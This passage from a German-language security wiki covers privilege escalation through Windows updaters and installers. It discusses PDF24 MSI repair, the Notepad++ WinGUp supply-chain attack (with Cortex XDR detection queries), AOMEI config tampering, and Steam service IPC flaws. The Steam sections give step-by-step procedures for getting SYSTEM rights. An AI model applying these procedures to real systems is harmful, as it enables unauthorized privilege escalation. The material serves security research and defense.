- Dieses Muster lässt sich auf andere Endpoint-Agents und Updater übertragen, die **temporäre Skripte an für alle beschreibbaren Speicherorten ablegen und später als SYSTEM ausführen**. Prüfen Sie auf vorhersehbare Namen, fehlende Semantik für exklusives Erstellen sowie Reparatur-/Update-Abläufe, die sich bei Bedarf auslösen lassen.

### Interaktive Installer-Reparatur und privilegierte Konsole

PDF24 Creator 11.15.1 veranschaulicht ein separates Risiko bei MSI-Reparaturen: Die benutzerdefinierte Druckerinstallationsaktion kann während einer Reparatur eine sichtbare Konsole mit SYSTEM-Rechten starten. Der Hersteller änderte den MSI-Installer in Version 11.15.2, um dieses Verhalten zu beheben. Eine ältere Produktversion ist lediglich ein Ansatzpunkt für die Triage. Prüfen Sie das registrierte oder erreichbare MSI-Paket, ob dieser Benutzer eine Reparatur starten kann, ob die anfällige benutzerdefinierte Aktion und die Verzögerung durch die Protokolldatei vorhanden sind und ob ein interaktiver Desktop die Konsole sichtbar machen kann. Die gemeldete Verzögerung wurde durch ein Oplock auf `faxPrnInst.log` erreicht; gewöhnliche Schreibrechte auf die Datei sind nicht die einzige Zugriffsvoraussetzung. Eine nicht-interaktive Shell, ein nicht zugängliches Paket oder ein gepatchter Installer können die Angriffskette unterbrechen. Dieses Problem hängt nicht von `AlwaysInstallElevated` ab und unterscheidet sich vom Ersetzen eines vorhersehbaren temporären Skripts.

---
## Remote-Supply-Chain-Hijacking durch schwache Updater-Validierung (WinGUp / Notepad++)

Zwischen Juni 2025 und Dezember 2025 lieferten Angreifer, die die Hosting-Infrastruktur hinter dem Notepad++-Updateprozess kompromittiert hatten, gezielt ausgewählten Opfern bösartige Manifeste aus. Ältere Updater auf WinGUp-Basis überprüften die Authentizität von Updates nicht vollständig, sodass eine manipulierte XML-Antwort Clients auf von Angreifern kontrollierte URLs umleiten konnte. Da der Client HTTPS-Inhalte akzeptierte, ohne sowohl eine vertrauenswürdige Zertifikatskette als auch eine gültige PE-Signatur des heruntergeladenen Installers zu erzwingen, luden Opfer ein trojanisiertes NSIS-`update.exe` herunter und führten es aus.<sup>[[12]](#references)[[13]](#references)</sup>

Ablauf (kein lokaler Exploit erforderlich):
1. **Abfangen der Infrastruktur**: CDN/Hosting kompromittieren und Updateprüfungen mit Angreifer-Metadaten beantworten, die auf eine bösartige Download-URL verweisen.
2. **Trojanisiertes NSIS**: Der Installer lädt eine Payload herunter und führt sie aus und missbraucht dabei zwei Ausführungsketten:
   - **Eigene signierte Binärdatei + Sideloading**: Die signierte Datei `BluetoothService.exe` von Bitdefender wird gebündelt und eine bösartige `log.dll` in ihrem Suchpfad abgelegt. Beim Start der signierten Binärdatei lädt Windows `log.dll` per Sideloading, die die Chrysalis-Backdoor entschlüsselt und reflektiv lädt (durch Warbird geschützt + API-Hashing, um statische Erkennung zu erschweren).
   - **Skriptgesteuerte Shellcode-Injektion**: NSIS führt ein kompiliertes Lua-Skript aus, das Win32-APIs (z. B. `EnumWindowStationsW`) verwendet, um Shellcode zu injizieren und Cobalt Strike Beacon bereitzustellen.<sup>[[12]](#references)</sup>

Maßnahmen zur Härtung und Erkennung für beliebige Auto-Updater:
- **Zertifikat + Signatur des heruntergeladenen Installers überprüfen** (Signatur des Herstellers festlegen, abweichenden CN/Zertifikatsketten ablehnen) und das Update-Manifest selbst signieren (z. B. mit XMLDSig). Durch das Manifest gesteuerte Weiterleitungen nur nach Validierung zulassen.
- **Sideloading eigener signierter Binärdateien** als Erkennungspunkt nach dem Download behandeln: Alarmieren, wenn eine signierte Hersteller-EXE eine DLL mit einem Namen außerhalb ihres kanonischen Installationspfads lädt (z. B. Bitdefender, das `log.dll` aus Temp/Downloads lädt) und wenn ein Updater Installer mit nicht vom Hersteller stammenden Signaturen aus temporären Verzeichnissen ablegt/ausführt.
- **Malwarespezifische Artefakte** überwachen, die in dieser Angriffskette beobachtet wurden (als allgemeine Ansatzpunkte nützlich): Mutex `Global\Jdhfv_1.0.1`, ungewöhnliche Schreibvorgänge von `gup.exe` nach `%TEMP%` und durch Lua gesteuerte Shellcode-Injektionsphasen.
- Notepad++ reagierte mit einer Härtung von WinGUp in Version 8.8.9 und späteren Versionen: Das zurückgegebene XML ist nun signiert (XMLDSig), und neuere Builds erzwingen die Zertifikats- und Signaturprüfung des heruntergeladenen Installers, statt allein dem Transport zu vertrauen.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Sideloading von <code>log.dll</code> durch eine von Bitdefender signierte EXE (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> startet ein Nicht-Notepad++-Installationsprogramm</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Diese Muster lassen sich auf alle Updater übertragen, die unsignierte Manifeste akzeptieren oder Installer-Signierer nicht festschreiben: Netzwerk-Hijacking + bösartiger Installer + BYO-signiertes Sideloading ermöglichen Remote Code Execution unter dem Deckmantel „vertrauenswürdiger“ Updates.

### Benachrichtigungskonfiguration als zweiter Update-Trigger

Ein Updater kann separate Remote-Konfigurationen verwenden, um **Inhalte bereitzustellen und deren Ausführung auszulösen**. Dafür muss man die Konfigurationen oder ihre Antworten kontrollieren; aus den Berichten geht nicht hervor, wie der Zugriff auf den Ursprung erlangt wurde. Im AOMEI-Fall legte `down_html.ini` eine Archiv-URL, eine Version (`thrid`) und einen MD5-Wert (`Val`) fest; der Angreifer erhöhte die Version und änderte URL und passenden Prüfsummenwert gemeinsam. Dies ist der oben beschriebene [Fehler an der Metadaten-Vertrauensgrenze](#2-hijacking-the-update-channel-to-run-code-as-system). Der zusätzliche Ausführungspfad war `Notifycfg.ini`: Sie wies `ABNotify.exe` an, ein extrahiertes `upgrade-now.html` über eine lokale `file:///`-URL in einer WebView zu laden. Die Seite navigierte automatisch zu einer benachbarten ausführbaren Datei, die von der WebView an die System-Shell übergeben wurde. Der untergeordnete Prozess erbte die Berechtigungen des Benachrichtigungsprogramms; dadurch erhielt er nicht automatisch SYSTEM-Rechte.<sup>[[17]](#references)[[18]](#references)</sup>

Google berichtete außerdem von einer manipulierten `Notifycfg.ini` mit mehr als 35.000 wiederholten Dummy-Abschnitten, die die normale Versionsprüfung dieses Clients überwanden. Der Bericht belegt keinen allgemeinen Parser-Bypass. Der Angreifer stellte die Remote-Dateien nach fünf- bis zehnminütigen Zeitfenstern wieder her, sodass nur Clients, die während dieser Zeiträume eine Abfrage durchführten, die geänderte Konfiguration erhielten. Über diesen Benachrichtigungskanal wurde außerdem eine separate [WebDAV/NTLM-Coercion-Köderdatei](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion) ausgeliefert, für deren Ausführung das Archiv nicht erforderlich war.<sup>[[18]](#references)</sup>

---
## Bootstrap über gemeinsam genutzten Speicher in privilegierte Service-IPC

Beschränke dich nicht auf die Enumeration benannter Pipes. Ein SYSTEM-Broker kann für den Verbindungsaufbau ein permissives benanntes **File Mapping** bereitstellen und anschließend anonyme Pipe-Handles in den anfragenden Prozess duplizieren. Im getesteten Design von Steam koordinieren `Global\SteamClientService_SharedMemFile` und `Global\SteamClientService_SharedMemLock` den Handshake mit Client-PID und Event; der Service gibt zwei Pipe-Handles zurück, und nachfolgende längenpräfixierte Anfragen verwenden `RunInterface` (`0x01`). Die DACL des Mappings erlaubte Clients aller Integritätsstufen. Das interne Objekt `CSteamServiceWin32` in `steamclient64.dll` bot einen praktischen Client: das build-spezifische globale Objekt auflösen, VTable-Slot 0 `Connect` aufrufen und anschließend die Interface-Maps verwenden, statt den Handshake neu zu implementieren. Der Zugriff auf die IPC ist nur eine Voraussetzung; ob es zu einer Rechteausweitung kommt, hängt von der Vertrauensentscheidung des privilegierten Handlers ab. <sup>[[19]](#references)[[20]](#references)</sup>

### Signiertes Manifest erweitert sich zu einer veralteten Allowlist ausführbarer Dateien

`IClientInstallUtils::AddInstallScriptToWhiteList` (Slot 21) überprüft die `kvsignatures` einer signierten VDF, speichert aber den **vollständig aufgelösten Pfadnamen der ausführbaren Datei**, nicht eine unveränderliche Dateiidentität. Verwende einen signierten `Run Process`-Eintrag wie `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe` und gib ein benutzerbeschreibbares `%INSTALLDIR%` an. Platziere eine ersetzte ausführbare Datei genau unter diesem aufgelösten Pfad und rufe dann `RunInstallScript` (Slot 22) mit einer unsignierten VDF auf, deren `Process 1` den allowlisteten Pfad angibt. Der Eintrag bleibt bis zum Neustart des Service bestehen; in der gemeldeten Implementierung wird die Datei vor dem SYSTEM-Start nicht erneut überprüft. Der Dateiname der platzierten Datei muss genau dem tatsächlichen signierten Eintrag entsprechen, nicht nur der Kategorie der Voraussetzung. <sup>[[19]](#references)[[20]](#references)</sup>

### Untergeordneter Prozess des Module-Managers umgeht die Signaturprüfung beim direkten Laden

`IClientModuleManager::LoadModule` (Slot 0) akzeptiert Modulbytes, wenn die angegebene ID mit deren CRC32 übereinstimmt. `CallFunctionAsync` (Slot 3) wählt mit `flags & 8` den **Unterprozess-Zweig** statt des direkten Reflective-Load-Zweigs, der eine Valve-Signatur überprüft. Der Service schreibt `legacycompat\servicecall_<CRC>.dll` und startet `legacycompat\steamservice.exe /runfunc ...` aus dem Installationsverzeichnis. Ist dieses Verzeichnis benutzerbeschreibbar, platziere eine ausführbare Datei unter dem zweiten Pfad, lade ein beliebiges Wegwerfmodul mit passender CRC und rufe die asynchrone Methode mit gesetztem Bit 3 auf. Im gemeldeten Build wurden weder die untergeordnete ausführbare Datei noch die auf die Festplatte geschriebene DLL authentifiziert. Das Modul selbst muss keine funktionsfähige Payload sein: Die ersetzte untergeordnete ausführbare Datei wird als SYSTEM ausgeführt. <sup>[[19]](#references)[[20]](#references)</sup>

### Prüfung von Katalogmitgliedern vor der privilegierten Treiberinstallation

Prüfe bei einem Broker für Treiberinstallationen, ob seine Katalogvalidierung **genau die INF-Datei bindet, die an den Installer übergeben wird**. Im gemeldeten Pfad `InstallVrLinkDongleDriver` validiert `WinVerifyTrust` einen Katalog, und `CryptCATAdminCalcHashFromFileHandle` sucht in einem vom Aufrufer angegebenen Verzeichnis nach *mindestens einer* passenden Datei. Anschließend führt der Service jedoch `pnputil /add-driver ... /install` für `netrtwlanuval.inf` aus, ohne festzustellen, ob diese INF-Datei tatsächlich zum vorgesehenen Katalog gehört. Ein flaches Verzeichnis oder ein architekturspezifisches Verzeichnis wird akzeptiert. Ein signierter Katalog mit einem beliebigen passenden Verzeichniseintrag kann daher die schwache Service-Prüfung bestehen, selbst wenn sich die an den privilegierten Installer übergebene INF-Datei davon unterscheidet. Gehe nicht davon aus, dass dies allein die Windows-Treibersignaturrichtlinie außer Kraft setzt: Eine erfolgreiche Installation hängt weiterhin vom ersetzten Paket und den Richtlinien des Hosts ab. <sup>[[19]](#references)[[20]](#references)</sup>

Der Service gibt seine Validierungs-Handles frei, bevor `pnputil` die INF-Datei öffnet. Dadurch entsteht eine [TOCTOU-Lücke](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk) mit einer Treiberinstallation als Ziel statt einem ausführbaren Update. Ein Oplock kann einen Austausch zwischen der Prüfung und dem Öffnen durch den Installer zeitlich abstimmen. Dieselbe IPC ermöglicht unter separaten Zustimmungsvoraussetzungen auch [Eingabeweiterleitung auf dem Secure Desktop](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring). <sup>[[19]](#references)</sup>

## References
- [1] [Sicherheitshinweis – Netskope Client für Windows – lokale Rechteausweitung über einen Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope-Sicherheitshinweis NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope-Plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope-IPC-Client/Exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre und Razer Synapse 4 kompromittieren](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – lokale Rechteausweitung über beschreibbare Dateien im Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Rechteausweitung im Windows-Agent](https://checkmk.com/werk/16361)
- [10] [PoCs von sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Staatliche Akteure nutzen die Notepad++-Lieferkette aus](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – Update zum Vorfall mit kompromittierter Infrastruktur](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Umgehung des Fixes für CVE-2025-0309 im Netskope Client für Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Aufdeckung von Rechteausweitungsfehlern in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: Von gRPC zu SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Kompromittierung der Lieferkette von AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group und Mandiant – Untersuchung zeitlich begrenzter Manipulationen der Lieferkette](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – Turning the Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [Atredis – Turning the Valve PoCs](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
